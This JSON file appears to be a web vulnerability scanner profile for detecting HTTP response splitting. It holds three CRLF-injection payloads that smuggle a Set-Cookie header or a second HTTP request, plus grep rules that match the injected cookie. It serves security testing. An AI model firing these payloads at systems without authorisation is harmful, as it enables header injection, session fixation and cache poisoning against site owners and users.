[
  {
    "Name": "HTTP_Response_Splitting",
    "Enabled": true,
    "Scanner": 1,
    "Author": "@Xer0Days",
    "Payloads": [
      "INJECTX%0d%0aSet-Cookie:INJECTX123;%0d%0a",
      "INJECTX%0aSet-Cookie:INJECTX123;%0a",
      "INJECTX\\u{0120}HTTP/1.1\\u{010D}\\u{010A}Host:\\u{0120}crowdshield.com\\u{010D}\\u{010A}\\u{010D}\\u{010A}GET\\u{0120}/.injectx/r.php?http_split"
    ],
    "Encoder": [],
    "UrlEncode": false,
    "CharsToUrlEncode": "",
    "Grep": [
      "true,Or,Set-Cookie: INJECTX123",
      "true,Or,Set-Cookie:INJECTX123"
    ],
    "Tags": [
      "All"
    ],
    "PayloadResponse": false,
    "NotResponse": false,
    "TimeOut1": "",
    "TimeOut2": "",
    "isTime": false,
    "contentLength": "",
    "iscontentLength": false,
    "CaseSensitive": false,
    "ExcludeHTTP": false,
    "OnlyHTTP": true,
    "IsContentType": false,
    "ContentType": "",
    "HttpResponseCode": "",
    "NegativeCT": false,
    "IsResponseCode": false,
    "ResponseCode": "",
    "NegativeRC": false,
    "urlextension": "",
    "isurlextension": false,
    "NegativeUrlExtension": false,
    "MatchType": 1,
    "Scope": 0,
    "RedirType": 0,
    "MaxRedir": 0,
    "payloadPosition": 1,
    "payloadsFile": "",
    "grepsFile": "",
    "IssueName": "HTTP_Response_Splitting",
    "IssueSeverity": "Medium",
    "IssueConfidence": "Certain",
    "IssueDetail": "",
    "RemediationDetail": "",
    "IssueBackground": "",
    "RemediationBackground": "",
    "Header": [],
    "VariationAttributes": [],
    "InsertionPointType": [
      65,
      36,
      1,
      6,
      5,
      64,
      0,
      3,
      4
    ],
    "Scanas": false,
    "Scantype": 0,
    "pathDiscovery": false
  }
]